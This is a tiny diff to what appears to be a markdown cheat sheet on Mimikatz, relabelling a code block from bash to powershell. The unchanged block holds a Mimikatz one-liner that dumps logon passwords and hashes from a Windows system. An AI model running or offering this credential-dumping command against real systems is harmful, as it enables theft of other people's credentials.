@@ -28,7 +28,7 @@ Mimikatz is a tool for dumping passwords and hashes from Windows systems.
 
 ## **Running as a one-liner**
 
-  ```bash
+  ```powershell
   .\mimikatz.exe “privilege::debug” “sekurlsa::logonpasswords” “exit”
   ```
 
